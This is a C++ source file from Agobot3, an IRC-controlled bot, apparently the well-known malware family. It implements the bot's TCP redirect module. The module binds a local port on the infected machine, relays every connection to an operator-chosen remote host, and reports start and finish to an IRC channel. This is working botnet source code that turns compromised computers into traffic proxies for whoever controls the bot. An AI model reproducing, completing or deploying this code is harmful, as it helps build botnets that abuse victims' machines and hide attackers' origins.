/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redir_tcp.h"
#include "mainctrl.h"
#include "utility.h"

CRedirectTCP_XmitThread::CRedirectTCP_XmitThread() { m_szType="CRedirectTCP_XmitThread"; m_sRedirectName.Assign("redirtcp"); }

void CRedirectTCP_XmitThread::StartRedirect()
{	char szBuf[4096]; int iErr;
	while(m_pRedirect->m_bRedirecting)
	{	memset(szBuf, 0, sizeof(szBuf));
		if(!m_pRedirTCP_Recv->m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iErr)) break;
		if(!m_pRedirTCP_Recv->m_sClientSocket.Write(szBuf, iErr)) break; }

	m_pRedirTCP_Recv->m_sClientSocket.Disconnect(); }

CRedirectTCP_RecvThread::CRedirectTCP_RecvThread() { m_szType="CRedirectTCP_RecvThread"; m_sRedirectName.Assign("redirtcp"); }

void CRedirectTCP_RecvThread::StartRedirect()
{	m_sServerSocket=INVALID_SOCKET;
	while(m_pRedirect->m_bRedirecting)
	{	
		// Connect to the server
		if(!m_sServerSocket.Connect(m_sRemoteAddr.CStr(), m_iRemotePort)) // Connect failed, exit
		{	m_sServerSocket.Disconnect(); return; }

		int iLen; char szBuf[4096]; fd_set fd;

		SET_SOCK_BLOCK(m_sClientSocket.GetSocket(), 0);
		SET_SOCK_BLOCK(m_sServerSocket.GetSocket(), 0);

		while(m_pRedirect->m_bRedirecting)
		{
			m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
			if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
			m_sClientSocket.Write(szBuf, iLen);

			m_sClientSocket.Recv(szBuf, sizeof(szBuf), &iLen);
			if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
			m_sServerSocket.Write(szBuf, iLen);
		}

		break; }

	m_sClientSocket.Disconnect();
	m_sServerSocket.Disconnect();
}

CRedirectTCP::CRedirectTCP() { m_szType="CRedirectTCP"; m_sRedirectName.Assign("redirtcp"); }

void CRedirectTCP::StartRedirect()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: redirecting from port %d to \"%s:%d\".", \
								  m_sRedirectName.CStr(), m_iLocalPort, m_sRemoteAddr.CStr(), m_iRemotePort);

	if(!m_sListenSocket.Bind(m_iLocalPort)) return;

	while(m_pRedirect->m_bRedirecting && g_pMainCtrl->m_bRunning)
	{	CSocket sClientSocket(true);
		if(m_sListenSocket.Accept(sClientSocket))
		{	CRedirectTCP_RecvThread *pTemp=new CRedirectTCP_RecvThread;
			pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirTCP=this;
			pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_iRemotePort=m_iRemotePort;
			pTemp->m_sRemoteAddr.Assign(m_sRemoteAddr); pTemp->m_sClientSocket=sClientSocket;
			pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
			pTemp->Start(true); }
		else
			break;
		Sleep(250); }

	m_sListenSocket.Disconnect();

	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished redirect from port %d to \"%s:%d\".", \
								  m_sRedirectName.CStr(), m_iLocalPort, m_sRemoteAddr.CStr(), m_iRemotePort); }
